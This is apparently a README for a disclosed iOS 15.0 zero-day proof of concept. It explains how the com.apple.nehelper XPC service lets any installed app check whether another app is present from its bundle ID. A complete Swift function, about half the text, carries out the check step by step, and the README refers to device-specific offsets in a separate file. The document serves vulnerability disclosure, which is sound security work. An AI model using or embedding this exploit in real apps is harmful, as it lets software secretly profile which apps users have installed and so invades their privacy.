# nehelper enumerate installed apps 0-day (iOS 15.0)

I've updated this code to avoid using Private API directly. Read more in my [blog post](https://habr.com/en/post/580272/). However, that means that now this code is iOS version-specific and possibly device model-specific. So if it doesn't work on your device, recalculate and update the offsets in `c.c` file. The original code can be found in [direct](https://github.com/illusionofchaos/ios-nehelper-enum-apps-0day/tree/direct) branch.

The vulnerability allows any user-installed app to determine whether any app is installed on the device given its bundle ID.

XPC endpoint "com.apple.nehelper" has a method accessible to any app that accepts bundle ID as a parameter and returns an array containing some cache UUIDs if the app with matching bundle ID is installed on the device or an empty array otherwise.
This happens in  `-[NEHelperCacheManager onQueueHandleMessage:]` in `/usr/libexec/nehelper`.

```
func isAppInstalled(bundleId: String) -> Bool {
    let connection = xpc_connection_create_mach_service("com.apple.nehelper", nil, 2)!
    xpc_connection_set_event_handler(connection, { _ in })
    xpc_connection_resume(connection)
    let xdict = xpc_dictionary_create(nil, nil, 0)
    xpc_dictionary_set_uint64(xdict, "delegate-class-id", 1)
    xpc_dictionary_set_uint64(xdict, "cache-command", 3)
    xpc_dictionary_set_string(xdict, "cache-signing-identifier", bundleId)
    let reply = xpc_connection_send_message_with_reply_sync(connection, xdict)
    if let resultData = xpc_dictionary_get_value(reply, "result-data"), xpc_dictionary_get_value(resultData, "cache-app-uuid") != nil {
        return true
    }
    return false
}
```
